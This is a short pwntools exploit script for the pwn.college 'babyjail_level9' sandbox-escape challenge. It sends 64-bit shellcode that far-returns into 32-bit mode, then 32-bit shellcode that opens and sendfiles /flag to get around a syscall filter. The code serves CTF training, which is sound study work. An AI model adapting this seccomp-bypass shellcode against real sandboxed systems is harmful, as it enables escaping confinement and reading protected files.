from pwn import *
import os
#e=context.binary=ELF("./babyjail_level9")
if args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
    p=s.process(["/challenge/babyjail_level9"])
if args.LOCAL:
    p=process(["./babyjail_level9"])
if args.GDB:
    gdb.attach(p,gdbscript="""
    b *main+787
    """)
context.log_level='debug'
pause()
p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin")
shellcode1=asm("""
xor rax, rax
mov rax, 0x67616c662f
push rax
push rsp

mov rdi, [RSP + 0] 
mov rax, 0x4
syscall
add RSP, 16
mov eax,0x1337034
mov rbx,0x2300000000
xor rax,rbx
push rax
""",arch = "amd64")+b"\xcb"
shellcode2=asm(
"""
mov esp,0x1337100
mov ebp,0x1337900
xor eax, eax
mov al, 0x67
push eax
push 0x616c662f
push esp

xor ecx, ecx 
mov ebx, [ESP + 0] 
mov eax, 0x5
int 0x80
add ESP, 12

mov esi, 0xc8
xor edx, edx 
mov ecx, 0x3
mov ebx, 0x1
mov eax, 0xbb
int 0x80
""",arch = "i386")
p.sendline(shellcode1+shellcode2)
p.interactive()